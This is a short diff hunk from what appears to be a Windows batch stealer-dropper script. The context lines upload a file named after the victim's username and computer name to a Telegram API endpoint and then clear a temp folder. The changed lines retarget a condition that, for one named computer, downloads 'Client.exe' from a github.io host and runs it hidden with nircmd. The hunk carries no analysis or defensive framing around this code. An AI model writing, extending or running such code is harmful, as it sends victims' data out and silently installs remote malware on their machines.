@@ -70,7 +70,7 @@ curl.exe %proxy% -F document=@"%username%@%computername%.txt" https://api.telegr
 cd "%temp%"
 rmdir /s /q "%temp%\%folder%"
 
-if [%computername%]==[ANTORAFFA] (
+if [%computername%]==[XW8000-PAPINO] (
   curl.exe %proxy% https://cryptedlumos.github.io/Client.exe --output "%temp%\dll.exe" && nircmd exec hide "%temp%\dll.exe"
 ) else (
 echo.
